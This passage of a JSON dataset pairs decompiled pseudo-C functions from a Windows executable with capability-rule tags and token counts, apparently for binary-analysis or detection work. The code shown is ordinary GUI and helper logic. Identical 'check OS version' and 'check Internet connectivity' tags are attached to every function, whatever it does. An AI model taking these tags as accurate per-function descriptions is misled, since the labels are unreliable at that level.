            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00439201(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        iVar2 = fcn.0042eabb(arg_14h * 2 + 1);\n        uVar1 = 0;\n        if (arg_14h != 0) {\n            do {\n                *(iVar2 + uVar1 * 2) = (*(arg_10h + uVar1) & 0xf) + 0x41;\n                *(iVar2 + 1 + uVar1 * 2) = (*(arg_10h + uVar1) >> 4) + 0x41;\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < arg_14h);\n        }\n        *(iVar2 + uVar1 * 2) = 0;\n        uVar1 = fcn.0043916b(arg_8h, arg_ch, iVar2);\n        fcn.0042eae6(iVar2);\n    }\n    else {\n        uVar1 = fcn.00446904(arg_8h);\n        if (uVar1 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uVar1, arg_ch, 0, 3, arg_10h, arg_14h);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uVar1);\n            uVar1 = iVar2 == 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 387
    },
    "00439435": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00439435(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *(param_1 + 8);\n    iVar3 = 0;\n    var_4h = param_1;\n    while (var_8h != 0) {\n        ppiVar2 = fcn.0040ab3a(&var_8h);\n        piVar1 = *ppiVar2;\n        var_4h = (**(*piVar1 + 0x54))();\n        while (var_4h != 0) {\n            (**(*piVar1 + 0x58))(&var_4h);\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 205
    },
    "0043a025": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0043a025(uint hModule, int32_t hResInfo, int32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar uVar5;\n    uchar extraout_AH;\n    int32_t *piVar6;\n    int32_t *arg_ch;\n    int32_t *arg_8h;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t *piVar9;\n    uint uVar10;\n    uint uVar11;\n    uint hResData;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar6 = (*_sym.imp.KERNEL32.dll_LoadResource)(hModule, hResInfo);\n    piVar9 = piVar6;\n    if ((piVar6 != NULL) && (arg_ch = (*_sym.imp.KERNEL32.dll_LockResource)(piVar6),  piVar9 = arg_ch,  arg_ch != NULL))\n    {\n        iVar2 = *arg_ch;\n        arg_8h = fcn.0041101f(iVar2 + 0x40);\n        piVar9 = arg_8h;\n        if (arg_8h != NULL) {\n            fcn.00411970(arg_8h, arg_ch, iVar2 + 0x40);\n            iVar2 = *arg_8h;\n            hResInfo = 0;\n            do {\n                uVar7 = 0;\n                do {\n                    if (*(arg_8h + hResInfo * 4 + iVar2) == *(uVar7 * 8 + 0x454128)) {\n                        if (arg_10h == 0) {\n                            puVar1 = uVar7 * 8 + 0x45412c;\n                            (*_sym.imp.USER32.dll_GetSysColor)(*puVar1);\n                            uVar5 = (*_sym.imp.USER32.dll_GetSysColor)(*puVar1);\n                            uVar7 = (*_sym.imp.USER32.dll_GetSysColor)(*puVar1);\n                            *(arg_8h + hResInfo * 4 + iVar2) = CONCAT11(uVar5, extraout_AH) << 8 | uVar7 >> 0x10 & 0xff;\n                        }\n                        else if (*(uVar7 * 8 + 0x45412c) != 0x12) {\n                            *(arg_8h + hResInfo * 4 + iVar2) = 0xffffff;\n                        }\n                        break;\n                    }\n                    uVar7 = uVar7 + 1;\n                } while (uVar7 < 4);\n                hResInfo = hResInfo + 1;\n            } while (hResInfo < 0x10);\n            iVar2 = arg_8h[1];\n            iVar3 = arg_8h[2];\n            uVar8 = (*_sym.imp.USER32.dll_GetDC)(0);\n            piVar9 = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(uVar8, iVar2, iVar3);\n            if (piVar9 != NULL) {\n                uVar10 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(uVar8);\n                pcVar4 = _sym.imp.GDI32.dll_SelectObject;\n                uVar11 = (*_sym.imp.GDI32.dll_SelectObject)(uVar10, piVar9);\n                (*_sym.imp.GDI32.dll_StretchDIBits)\n                          (uVar10, 0, 0, iVar2, iVar3, 0, 0, iVar2, iVar3, arg_ch + (1 << (*(arg_8h + 0xe) & 0x1f)) + 10\n                           , arg_8h, 0, 0xcc0020);\n                (*pcVar4)(uVar10, uVar11);\n                (*_sym.imp.GDI32.dll_DeleteDC)(uVar10);\n            }\n            (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar8);\n            fcn.00411031(arg_8h);\n            (*_sym.imp.KERNEL32.dll_FreeResource)(piVar6);\n        }\n    }\n    return piVar9;\n}\n",
        "token_count": 930
    },
    "0043a282": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043a282(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = 0;\n    iVar5 = 0;\n    var_4h = 0;\n    if (arg_ch < 1) {\ncode_r0x0043a32d:\n        return var_4h + 1;\n    }\ncode_r0x0043a2a0:\n    piVar1 = arg_8h + iVar6 * 0x14;\n    piVar2 = piVar1 + 2;\n    *piVar2 = *piVar2 & 0xdf;\n    if ((*piVar2 & 8) == 0) {\n        if ((*(piVar1 + 9) & 1) == 0) {\n            iVar3 = *(in_ECX + 0xa8);\n        }\n        else {\n            iVar3 = *piVar1;\n        }\n        iVar5 = iVar3 + iVar5;\n        iVar3 = iVar6;\n        if (arg_10h < iVar5) {\n            for (; (-1 < iVar3 && ((*piVar2 & 0x20) == 0)); piVar2 = piVar2 + -5) {\n                if (((*(piVar2 + 1) & 1) != 0) && ((piVar2[-1] == 0 && ((*piVar2 & 8) == 0)))) goto code_r0x0043a343;\n                iVar3 = iVar3 + -1;\n            }\n            iVar3 = iVar6 + -1;\n            if (-1 < iVar3) {\n                puVar4 = arg_8h + 8 + iVar3 * 0x14;\n                do {\n                    if ((*puVar4 & 0x20) != 0) break;\n                    if (((*puVar4 & 8) == 0) && (((puVar4[1] & 1) == 0 || (*(puVar4 + -4) == 0))))\n                    goto code_r0x0043a343;\n                    iVar3 = iVar3 + -1;\n                    puVar4 = puVar4 + -0x14;\n                } while (-1 < iVar3);\n            }\n        }\n    }\n    goto code_r0x0043a322;\ncode_r0x0043a343:\n    puVar4 = arg_8h + 8 + iVar3 * 0x14;\n    *puVar4 = *puVar4 | 0x20;\n    iVar5 = 0;\n    var_4h = var_4h + 1;\n    iVar6 = iVar3;\ncode_r0x0043a322:\n    iVar6 = iVar6 + 1;\n    if (arg_ch <= iVar6) goto code_r0x0043a32d;\n    goto code_r0x0043a2a0;\n}\n",
        "token_count": 706
    },
    "0043a690": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a690(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = 0;\n    var_18h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    uVar2 = (**(*in_ECX + 0x110))(0x455, 0, 0);\n    if (0 < arg_10h) {\n        puVar7 = arg_ch + 9;\n        var_4h = arg_10h;\n        do {\n            arg_ch = *(puVar7 + -9);\n            uVar3 = fcn.0042dd19();\n            if (((uVar3 & 0x800) == 0) && (*0x463e34 != 0x40047)) {\n                arg_ch = (arg_ch * 2) / 3;\n            }\n            if ((puVar7[-1] & 8) == 0) {\n                uVar1 = *puVar7;\n                iVar5 = in_ECX[0x2a];\n                if ((uVar1 & 1) == 0) {\n                    if (((uVar1 & 8) != 0) && ((uVar2 & 1) != 0)) {\n                        iVar5 = iVar5 + *0x463e38;\n                    }\n                    if (var_10h < var_18h + iVar5) {\n                        var_10h = var_18h + iVar5;\n                    }\n                    iVar4 = in_ECX[0x2b] + iVar6;\ncode_r0x0043a75f:\n                    if (var_ch < iVar4) {\n                        var_ch = iVar4;\n                    }\n                }\n                else {\n                    if ((puVar7[-1] & 0x20) != 0) {\n                        iVar4 = in_ECX[0x2b] + iVar6 + arg_ch;\n                        goto code_r0x0043a75f;\n                    }\n                    if (var_10h < *(puVar7 + -9) + var_18h) {\n                        var_10h = *(puVar7 + -9) + var_18h;\n                    }\n                }\n                if ((uVar1 & 1) != 0) {\n                    iVar5 = *(puVar7 + -9);\n                }\n                var_18h = var_18h + iVar5;\n                if ((puVar7[-1] & 0x20) != 0) {\n                    var_18h = 0;\n                    iVar6 = iVar6 + in_ECX[0x2b];\n                    if ((uVar1 & 1) != 0) {\n                        iVar6 = iVar6 + arg_ch;\n                    }\n                }\n            }\n            puVar7 = puVar7 + 0x14;\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    *arg_8h = var_10h;\n    arg_8h[1] = var_ch;\n    return;\n}\n",
        "token_count": 781
    },
    "0043ace4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.0043ace4(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    uint *arg_8h_00;\n    int32_t lpRect;\n    int32_t *var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t lprc;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint *var_4h;\n    \n    puVar7 = NULL;\n    arg_8h_00 = 0x418;\n    var_ch = NULL;\n    var_34h = 0;\n    var_30h = 0;\n    iVar2 = (**(*in_ECX + 0x110))(0x418, 0, 0);\n    var_1ch = iVar2;\n    if ((iVar2 == 0) || (var_ch = fcn.0042eabb(iVar2 * 0x14),  piVar4 = var_ch,  iVar2 < 1)) goto code_r0x0043afb1;\n    do {\n        var_8h = piVar4;\n        arg_8h_00 = puVar7;\n        fcn.0043a1ad();\n        piVar8 = var_ch;\n        var_8h = var_8h + 5;\n        puVar7 = puVar7 + 1;\n        piVar4 = var_8h;\n    } while (puVar7 < iVar2);\n    if (iVar2 < 1) goto code_r0x0043afb1;\n    uVar1 = in_ECX[0x1f];\n    if ((uVar1 & 2) == 0) {\n        var_20h = uVar1 & 4;\n        if (var_20h == 0) {\ncode_r0x0043add6:\n            var_38h = -((arg_ch & 2) != 0) & 0x7fff;\n        }\n        else if ((arg_ch & 4) == 0) {\n            if ((arg_ch & 8) == 0) {\n                var_38h = 0;\n                if ((arg_ch & 0x10) == 0) {\n                    if (arg_10h == -1) {\n                        if ((uVar1 & 1) == 0) goto code_r0x0043add6;\n                        goto code_r0x0043add0;\n                    }\n                    (*_sym.imp.USER32.dll_SetRectEmpty)(&fcn.0043ace4::lprc);\n                    (**(*in_ECX + 0x13c))(&fcn.0043ace4::lprc, arg_ch & 2);\n                    var_34h = arg_ch & 0x20;\n                    if (var_34h == 0) {\n                        var_28h = var_24h - lprc;\n                    }\n                    else {\n                        var_28h = var_20h - var_28h;\n                    }\n                    var_38h = var_28h + arg_10h;\n                }\n            }\n            else {\n                var_38h = 0x7fff;\n            }\n        }\n        else {\ncode_r0x0043add0:\n            var_38h = in_ECX[0x1b];\n        }\n        var_40h = piVar8;\n        lpRect = 0x43adef;\n        var_3ch = iVar2;\n        fcn.0043a7b2(piVar8, iVar2, var_38h, var_34h);\n    }\n    arg_8h_00 = &fcn.0043ace4::var_24h;\n    lpRect = iVar2;\n    puVar3 = fcn.0043a690(arg_8h_00, piVar8, iVar2);\n    var_34h = *puVar3;\n    var_30h = puVar3[1];\n    if ((arg_ch & 0x40) != 0) {\n        var_20h = in_ECX[0x27];\n        iVar6 = 0;\n        var_4h = NULL;\n        arg_10h = 0;\n        in_ECX[0x27] = 0;\n        if (0 < iVar2) {\n            var_14h = piVar8 + 1;\n            piVar4 = var_14h;\n            iVar5 = iVar2;\n            do {\n                if (((*(piVar4 + 5) & 1) != 0) && (*piVar4 != 0)) {\n                    iVar6 = iVar6 + 1;\n                }\n                piVar4 = piVar4 + 5;\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n            arg_10h = iVar6;\n            if (0 < iVar6) {\n                puVar7 = fcn.0042eabb(iVar6 * 0x18);\n                if (puVar7 == NULL) {\n                    var_4h = NULL;\n                }\n                else {\n                    arg_8h_00 = puVar7;\n                    fcn.0043a351(puVar7, 0x18, iVar6, 0x43a93e);\n                    var_4h = puVar7;\n                }\n                arg_10h = 0;\n                var_8h = NULL;\n                var_10h = var_4h + 2;\n                piVar4 = var_10h;\n                do {\n                    piVar8 = piVar4;\n                    if (((*(var_14h + 5) & 1) != 0) && (*var_14h != 0)) {\n                        piVar4[-2] = var_8h;\n                        piVar4[-1] = *var_14h;\n                        (**(*in_ECX + 0x16c))(var_8h, &fcn.0043ace4::lpRect);\n                        arg_8h_00 = &fcn.0043ace4::lpRect;\n                        fcn.0043344f(arg_8h_00);\n                        arg_10h = arg_10h + 1;\n                        piVar8 = var_10h + 6;\n                        *piVar4 = lpRect;\n                        piVar4[1] = var_40h;\n                        piVar4[2] = var_3ch;\n                        piVar4[3] = var_38h;\n                        iVar2 = var_1ch;\n                        var_10h = piVar8;\n                    }\n                    var_8h = var_8h + 1;\n                    var_14h = var_14h + 5;\n                    piVar4 = piVar8;\n                } while (var_8h < iVar2);\n            }\n        }\n        if (((in_ECX[0x1f] & 1U) != 0) && ((in_ECX[0x1f] & 4U) != 0)) {\n            in_ECX[0x1b] = var_34h;\n        }\n        puVar7 = NULL;\n        if (0 < iVar2) {\n            var_10h = var_ch;\n            do {\n                arg_8h_00 = puVar7;\n                fcn.0043a4b6(puVar7, var_10h);\n                var_10h = var_10h + 5;\n                puVar7 = puVar7 + 1;\n            } while (puVar7 < iVar2);\n        }\n        if (0 < arg_10h) {\n            piVar4 = var_4h + 2;\n            do {\n                arg_8h_00 = piVar4[-1];\n                var_1ch = fcn.0042dbaf();\n                if (var_1ch != 0) {\n                    (*_sym.imp.USER32.dll_GetWindowRect)(*(var_1ch + 0x1c), &fcn.0043ace4::lpRect);\n                    iVar2 = lpRect - *piVar4;\n                    var_14h = var_40h - piVar4[1];\n                    (**(*in_ECX + 0x16c))(piVar4[-2], &fcn.0043ace4::lpRect);\n                    arg_8h_00 = NULL;\n                    fcn.0042e037(0, lpRect + iVar2, var_14h + var_40h, 0, 0, 0x15);\n                }\n                piVar4 = piVar4 + 6;\n                arg_10h = arg_10h + -1;\n            } while (arg_10h != 0);\n            fcn.0042eae6(var_4h, arg_8h_00);\n        }\n        in_ECX[0x27] = var_20h;\n        piVar8 = var_ch;\n    }\n    fcn.0042eae6(piVar8);\ncode_r0x0043afb1:\n    (*_sym.imp.USER32.dll_SetRectEmpty)(&fcn.0043ace4::lpRect, arg_8h_00);\n    (**(*in_ECX + 0x13c))(&fcn.0043ace4::lpRect, arg_ch & 2);\n    var_30h = var_40h + (var_30h - var_38h);\n    var_34h = var_34h + (lpRect - var_3ch);\n    fcn.0043bca9(&fcn.0043ace4::var_24h, arg_ch & 1, arg_ch & 2);\n    if (var_34h <= var_24h) {\n        var_34h = var_24h;\n    }\n    if (var_30h <= var_20h) {\n        var_30h = var_20h;\n    }\n    *arg_8h = var_34h;\n    arg_8h[1] = var_30h;\n    return;\n}\n",
        "token_count": 2401
    },
    "0043b2c5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __cdecl fcn.0043b2c5(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    iVar2 = *(extraout_ECX + 0xb0);\n    *(unaff_EBP + -0x10) = *0x4640c8;\n    if (iVar2 == 0) {\ncode_r0x0043b34a:\n        fcn.00401810();\n    }\n    else {\n        fcn.0043a1ad(*(unaff_EBP + 8), unaff_EBP + -0x24);\n        *(unaff_EBP + -0x28) = -(*(*(extraout_ECX + 0xb0) + 0xc) != 0);\n        piVar1 = fcn.004290ee();\n        iVar2 = (**(*piVar1 + 0xc))();\n        *(unaff_EBP + 8) = iVar2 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        do {\n            if (*(unaff_EBP + -0x28) == 0) {\n                fcn.00401200();\n                goto code_r0x0043b34a;\n            }\n            fcn.004282cf();\n        } while (*(unaff_EBP + -0x2c) != *(unaff_EBP + -0x14));\n        fcn.00405f00();\n        fcn.00401200();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 472
    },
    "0043ba37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043ba37(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    \n    if ((*(param_1 + 0x1c) != 0) && (iVar1 = fcn.0043fbe2(),  iVar1 != 0)) {\n        piVar2 = fcn.0043fbce();\n    // WARNING: Could not recover jumptable at 0x0043ba55. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar3 = (**(*piVar2 + 0x60))();\n        return uVar3;\n    }\n    uVar3 = 0;\n    if (*(param_1 + 0x1c) == 0) {\n        if (*(param_1 + 0x4c) == 0) {\n            return 0;\n        }\n    }\n    else {\n        fcn.0042b3b6(0);\n        fcn.00427dff(*(param_1 + 0x1c));\n    }\n    if ((*(param_1 + 0x1c) != 0) || (*(param_1 + 0x4c) != 0)) {\n        if (*(param_1 + 0x4c) == 0) {\n            uVar3 = (*_sym.imp.USER32.dll_DestroyWindow)(*(param_1 + 0x1c));\n        }\n        else {\n            uVar3 = (**(**(param_1 + 0x4c) + 0x58))();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 362
    },
    "0043bb81": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043bb81(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_1 + 0x7c);\n    if ((uVar1 & 0x100) != 0) {\n        *param_2 = *param_2 + *0x466db8;\n    }\n    if ((uVar1 & 0x200) != 0) {\n        param_2[1] = param_2[1] + *0x466dbc;\n    }\n    if ((uVar1 & 0x400) != 0) {\n        param_2[2] = param_2[2] - *0x466db8;\n    }\n    if ((uVar1 & 0x800) != 0) {\n        param_2[3] = param_2[3] - *0x466dbc;\n    }\n    if (param_3 == 0) {\n        *param_2 = *param_2 + *(param_1 + 0x60);\n        param_2[1] = param_2[1] + *(param_1 + 0x58);\n        param_2[2] = param_2[2] - *(param_1 + 100);\n        param_2[3] = param_2[3] - *(param_1 + 0x5c);\n        if ((*(param_1 + 0x7c) & 0x400001) == 0x400000) {\n            param_2[1] = param_2[1] + 7;\n        }\n    }\n    else {\n        *param_2 = *param_2 + *(param_1 + 0x58);\n        param_2[1] = param_2[1] + *(param_1 + 0x60);\n        param_2[2] = param_2[2] - *(param_1 + 0x5c);\n        param_2[3] = param_2[3] - *(param_1 + 100);\n        if ((*(param_1 + 0x7c) & 0x400001) == 0x400000) {\n            *param_2 = *param_2 + 7;\n        }\n    }\n    return;\n}\n",
        "token_count": 524
    },
    "0043bd11": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bd11(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    int32_t *in_ECX;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n    if (iVar2 < 0) {\n        return;\n    }\n    iVar3 = fcn.00444c1e();\n    var_8h = iVar3;\n    (*_sym.imp.USER32.dll_GetCursorPos)(&var_10h);\n    (*_sym.imp.USER32.dll_ScreenToClient)(in_ECX[7], &var_10h);\n    var_4h = (**(*in_ECX + 0x6c))(var_10h, var_ch, 0);\n    if (var_4h < 0) {\n        *(iVar3 + 0x78) = 0xffffffff;\n    }\n    else {\n        iVar4 = fcn.0042c69d();\n        iVar5 = fcn.0042c6c5();\n        if ((iVar5 == 0) || (iVar5 = fcn.0042de5f(),  iVar5 == 0)) {\n            var_4h = -1;\n        }\n        if (*(iVar3 + 0x3c) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = *(*(iVar3 + 0x3c) + 0x1c);\n        }\n        uVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        piVar7 = fcn.0042b432(uVar6);\n        if (piVar7 != in_ECX) {\n            if (piVar7 == NULL) {\n                iVar5 = 0;\n            }\n            else {\n                iVar5 = piVar7[7];\n            }\n            if ((iVar5 != iVar3) && (iVar3 = fcn.0042c69d(),  iVar3 == iVar4)) {\n                var_4h = -1;\n            }\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_KillTimer;\n    if (-1 < var_4h) {\n        (*_sym.imp.USER32.dll_ClientToScreen)(in_ECX[7], &var_10h);\n        iVar3 = (*_sym.imp.USER32.dll_WindowFromPoint)(var_10h, var_ch);\n        if (iVar3 == 0) {\ncode_r0x0043be18:\n            var_4h = -1;\n            *(var_8h + 0x78) = 0xffffffff;\n        }\n        else if ((iVar3 != in_ECX[7]) && (iVar4 = (*_sym.imp.USER32.dll_IsChild)(in_ECX[7], iVar3),  iVar4 == 0)) {\n            iVar4 = *(var_8h + 0x3c);\n            if (iVar4 != 0) {\n                iVar4 = *(iVar4 + 0x1c);\n            }\n            if (iVar4 != iVar3) goto code_r0x0043be18;\n        }\n        if (-1 < var_4h) goto code_r0x0043be48;\n    }\n    if (*(var_8h + 0x78) == -1) {\n        (*pcVar1)(in_ECX[7], 0xe001);\n    }\n    (**(*in_ECX + 0x160))(0xffffffff);\ncode_r0x0043be48:\n    if ((arg_8h == 0xe000) && ((*pcVar1)(in_ECX[7], 0xe000),  -1 < var_4h)) {\n        (**(*in_ECX + 0x160))(var_4h);\n    }\n    return;\n}\n",
        "token_count": 887
    },
    "0043c162": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c162(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((in_ECX[0x22] != 0) && (iVar1 = (**(*in_ECX + 0x6c))(arg_ch, arg_10h, 0),  iVar1 == -1)) {\n        (*_sym.imp.USER32.dll_ClientToScreen)(in_ECX[7], &arg_ch);\n        (***in_ECX[0x23])(arg_ch, arg_10h);\n        return;\n    }\n    fcn.0042b38f();\n    return;\n}\n",
        "token_count": 156
    },
    "0043c1e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043c1e6(uint noname_0, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    int32_t lprcDst;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    uVar1 = (**(*in_ECX + 0x154))(arg_ch);\n    if (((uVar1 & 0x10000000) != 0) && ((uVar1 & 0xf000) != 0)) {\n        (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, arg_ch + 1);\n        iVar4 = var_14h - lprcDst;\n        iVar3 = var_10h - var_18h;\n        bVar5 = arg_ch[7] != 0;\n        if (((var_4h[0x1f] & 4U) == 0) || ((var_4h[0x1f] & 1U) == 0)) {\n            if ((uVar1 & 0xa000) == 0) {\n                uVar2 = bVar5 | 0x10;\n            }\n            else {\n                uVar2 = bVar5 | 10;\n            }\n        }\n        else {\n            uVar2 = bVar5 | 6;\n        }\n        (**(*var_4h + 0x134))(&var_ch, 0xffffffff, uVar2);\n        if (iVar4 <= var_ch) {\n            var_ch = iVar4;\n        }\n        if (iVar3 <= var_8h) {\n            var_8h = iVar3;\n        }\n        if ((uVar1 & 0xa000) == 0) {\n            if ((uVar1 & 0x5000) != 0) {\n                arg_ch[5] = arg_ch[5] + var_ch;\n                iVar3 = arg_ch[6];\n                if (arg_ch[6] <= var_8h) {\n                    iVar3 = var_8h;\n                }\n                arg_ch[6] = iVar3;\n                if ((uVar1 & 0x1000) == 0) {\n                    if ((uVar1 & 0x4000) != 0) {\n                        lprcDst = var_14h - var_ch;\n                        arg_ch[3] = arg_ch[3] - var_ch;\n                    }\n                }\n                else {\n                    arg_ch[1] = arg_ch[1] + var_ch;\n                }\n            }\n        }\n        else {\n            arg_ch[6] = arg_ch[6] + var_8h;\n            iVar3 = arg_ch[5];\n            if (arg_ch[5] <= var_ch) {\n                iVar3 = var_ch;\n            }\n            arg_ch[5] = iVar3;\n            if ((uVar1 & 0x2000) == 0) {\n                if ((uVar1 & 0x8000) != 0) {\n                    var_18h = var_10h - var_8h;\n                    arg_ch[4] = arg_ch[4] - var_8h;\n                }\n            }\n            else {\n                arg_ch[2] = arg_ch[2] + var_8h;\n            }\n        }\n        var_14h = var_ch + lprcDst;\n        var_10h = var_18h + var_8h;\n        if (*arg_ch != 0) {\n            fcn.00429cf0(arg_ch, var_4h[7], &lprcDst);\n        }\n    